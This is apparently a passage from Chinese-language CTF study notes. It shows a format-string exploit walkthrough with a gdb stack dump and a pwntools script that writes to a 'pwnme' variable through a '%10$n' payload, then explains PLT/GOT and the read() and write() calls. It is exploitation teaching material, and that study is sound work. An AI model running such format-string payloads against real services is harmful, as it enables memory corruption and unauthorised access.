</code></pre></div><p>偏移是10, 拖动调试。第二次printf处下断点。</p> <div class="language- extra-class"><pre><code>payload = flat(p32(0x0804A068), 'a'*4 ,'%10$n')
send(payload)后 
</code></pre></div><p>x/16wx $esp # 查看栈情况</p> <div class="language- extra-class"><pre><code>fff2a488 fff2a47e f7f47580 00000001 00000000 00000001 f7f90940 61610001 000a6161 00000000 0804a068 61616161
******01 ******02 ******03 ******04 ******05 ******06 ******07 ******08 ******09 ******10 ******11 ***aaaa*
</code></pre></div><p>exp:</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
conn <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./e41a0f684d0e497f87bb309f91737e4d'</span><span class="token punctuation">)</span>
<span class="token comment"># conn = remote(&quot;220.249.52.133&quot;,56225)</span>
pwnme <span class="token operator">=</span> 
payload1 <span class="token operator">=</span> <span class="token string">'aaaa'</span>
payload2 <span class="token operator">=</span> flat<span class="token punctuation">(</span>p32<span class="token punctuation">(</span>pwnme<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">4</span> <span class="token punctuation">,</span><span class="token string">'%10$n'</span><span class="token punctuation">)</span>  <span class="token comment">#pwnme地址占4个字节，所以后面需要打印4个a</span>
conn<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'please tell me your name:'</span><span class="token punctuation">)</span>
conn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>
<span class="token comment"># gdb.attach(conn)</span>
conn<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'leave your message please:'</span><span class="token punctuation">)</span> 
conn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>
conn<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>conn<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br></div></div><h3 id="plt-glt"><a href="#plt-glt" class="header-anchor">#</a> PLT &amp; GLT</h3> <p><a href="https://blog.csdn.net/linyt/article/details/51635768" target="_blank" rel="noopener noreferrer">Link<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></p> <table><thead><tr><th>简称</th> <th>全称</th> <th>Desc</th></tr></thead> <tbody><tr><td>GOT</td> <td>Global Offset Table</td> <td>存放函数地址的数据表，重局偏移表</td></tr> <tr><td>PLT</td> <td>Procedure Link Table</td> <td>额外代码段表，称为程序链接表</td></tr></tbody></table> <p>联合出手完成重定位。</p> <p><img src="/text_del/assets/img/C01.23d52081.jpg" alt=""></p> <h3 id="常用函数"><a href="#常用函数" class="header-anchor">#</a> 常用函数</h3> <h4 id="read"><a href="#read" class="header-anchor">#</a> read()</h4> <p>用于文件描述符对应的文件中读取数据，原型：</p> <p><code>ssize_t read(int fd,void*buf,size_t count)</code></p> <p>参数说明：</p> <div class="language- extra-class"><pre><code>fd: 是文件描述符, 从command line获取数据时，为0
buf: 为读出数据的缓冲区；
count: 为每次读取的字节数（是请求读取的字节数，读上来的数据保
存在缓冲区buf中，同时文件的当前读写位置向后移）
</code></pre></div><p>返回值：</p> <div class="language- extra-class"><pre><code>成功：返回读出的字节数
失败：返回-1，并设置errno，如果在调用read
之前到达文件末尾，则这次read返回0
</code></pre></div><h4 id="write"><a href="#write" class="header-anchor">#</a> write()</h4> <p>用于将数据写入到文件描述符对应的文件，原型：</p> <p><code>ssize_t write(int fd,const void*buf,size_t count);</code></p> <p>参数说明：</p> <div class="language- extra-class"><pre><code>fd:是文件描述符（输出到command line，就是1）
buf:通常是一个字符串，需要写入的字符串
count：是每次写入的字节数
</code></pre></div><p>返回值：</p> <div class="language- extra-class"><pre><code>成功：返回写入的字节数
失败：返回-1并设置errno
ps： 写常规文件时，write的返回值通常等于请求写的字节
数count， 而向终端设备或者网络写时则不一定
</code></pre></div><p>因此，read函数就可以取代scanf从command line读取数据；write函数就可以代替printf，往command line打印输出。</p></div> <footer class="page-edit" style="display:none;"><!----> <!----></footer> <!----> <!----></main> <!----></div></div></div></div><div class="global-ui"><div class="back-to-ceiling" style="right:1rem;bottom:6rem;width:2.5rem;height:2.5rem;border-radius:.25rem;line-height:2.5rem;display:none;" data-v-44bd5a18 data-v-44bd5a18><svg t="1574745035067" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="5404" class="icon" data-v-44bd5a18><path d="M526.60727968 10.90185116a27.675 27.675 0 0 0-29.21455937 0c-131.36607665 82.28402758-218.69155461 228.01873535-218.69155402 394.07834331a462.20625001 462.20625001 0 0 0 5.36959153 69.94390903c1.00431239 6.55289093-0.34802892 13.13561351-3.76865779 18.80351572-32.63518765 54.11355614-51.75690182 118.55860487-51.7569018 187.94566865a371.06718723 371.06718723 0 0 0 11.50484808 91.98906777c6.53300375 25.50556257 41.68394495 28.14064038 52.69160883 4.22606766 17.37162448-37.73630017 42.14135425-72.50938081 72.80769204-103.21549295 2.18761121 3.04276886 4.15646224 6.24463696 6.40373557 9.22774369a1871.4375 1871.4375 0 0 0 140.04691725 5.34970492 1866.36093723 1866.36093723 0 0 0 140.04691723-5.34970492c2.24727335-2.98310674 4.21612437-6.18497483 6.3937923-9.2178004 30.66633723 30.70611158 55.4360664 65.4791928 72.80769147 103.21549355 11.00766384 23.91457269 46.15860503 21.27949489 52.69160879-4.22606768a371.15156223 371.15156223 0 0 0 11.514792-91.99901164c0-69.36717486-19.13165746-133.82216804-51.75690182-187.92578088-3.42062944-5.66790279-4.76302748-12.26056868-3.76865837-18.80351632a462.20625001 462.20625001 0 0 0 5.36959269-69.943909c-0.00994388-166.08943902-87.32547796-311.81420293-218.6915546-394.09823051zM605.93803103 357.87693858a93.93749974 93.93749974 0 1 1-187.89594924 6.1e-7 93.93749974 93.93749974 0 0 1 187.89594924-6.1e-7z" p-id="5405" data-v-44bd5a18></path><path d="M429.50777625 765.63860547C429.50777625 803.39355007 466.44236686 1000.39046097 512.00932183 1000.39046097c45.56695499 0 82.4922232-197.00623328 82.5015456-234.7518555 0-37.75494459-36.9345906-68.35043303-82.4922232-68.34111062-45.57627738-0.00932239-82.52019037 30.59548842-82.51086798 68.34111062z" p-id="5406" data-v-44bd5a18></path></svg></div></div></div>
    <script src="/text_del/assets/js/app.38a0347b.js" defer></script><script src="/text_del/assets/js/4.6ff137c7.js" defer></script><script src="/text_del/assets/js/1.9204637f.js" defer></script><script src="/text_del/assets/js/8.ffe0ad43.js" defer></script>
  </body>
</html>
